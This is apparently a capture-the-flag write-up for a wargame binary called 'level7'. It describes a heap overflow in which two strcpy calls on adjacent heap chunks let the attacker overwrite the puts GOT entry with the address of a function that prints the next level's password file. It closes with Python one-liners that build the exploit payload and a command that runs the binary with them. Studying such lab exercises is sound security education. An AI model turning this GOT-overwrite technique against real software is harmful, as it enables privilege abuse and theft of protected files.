# LEVEL7

## EXPLANATIONS
### BINARY BEHAVIOR
- 2 function main and m:
    - \<main\> :  
    -> buf1 and buf2 both mallocated with 8 bytes (heap1 and heap3) and fill respectively with 0x1 and 0x2 on the first bytes of heap  
    -> two other heap (heap2 and heap4) are allocated and their address are stores at the 4th bytes respectively in buf1 and buf2  
    -> strcpy argv1  in *(buf1 + 4) (heap2) and strcpy argv2 in in *(buf2 + 4) (heap4)  
    ->open home/user/level8/.pass  
    -> fgets content of .pass  
    ->puts('~~')
    - \<m\> :  
        printf()

### EXPLOI STRATEGY
Goal here is to overwrite Global Offset Table address of puts with m function address.  
In main function, fgets write contents of .pass file into a buffer (data section or heap ?)  
If we success to call m function, it prints the content of this buffer.  


- First strcpy replaces value stored inside (buf1 + 4) heap3[4] (heap4 addr) by addr GOT puts (thanks to argv1)  
    - STRCPY1 :  
        - DEST : buf1 + 4 == heap2 => overflows to heap3 + 4 (WILL WRITE INTO HEAP3+4)  
        - SRC : argv1 (padding to access heap3+4 + addr puts GOT)  
- Second strcpy stores m address (argv2) into puts GOT addr  
    - STRCPY2 :  
        - DEST : buf2 + 4 (previously heap4) now points to puts GOT  
        - SRC : argv2 (addr of m)  
### RUN COMMAND
```
python -c "print('A' * 20 + '\x08\x04\x99\x28'[::-1])" > /tmp/argv1_string
python -c "print('\x08\x04\x84\xf4'[::-1])" > /tmp/argv2_string
/home/user/level7/level7 $(cat /tmp/argv1_string) $(cat /tmp/argv2_string)
```